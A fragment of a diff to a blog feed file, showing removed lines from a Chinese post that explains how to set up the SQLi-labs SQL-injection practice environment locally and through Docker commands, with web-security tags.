-<li><a href="http://localhost/sqli-labs" target="_blank" rel="noopener">http://localhost/sqli-labs</a>  点击 setup/reset database for labs</li>
-</ul>
-<ol start="2">
-<li>Docker</li>
-</ol>
-<ul>
-<li>docker search sqli-labs</li>
-<li>docker pull acgplano/sqli-labs</li>
-<li>docker images</li>
-<li>docker run -dt --name sqli -p 80:80 --rm acgplano/sqli-labs  (-dt 后台运行 –name 命名 -p 端口名  80:80 本地：docker --rm 当停止后删除产生镜像)</li>
-</ul>
-<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>对应代码，边看代码边理解，学会一半，就基本没问题。  </p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
         <tag>web安全</tag>
-        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
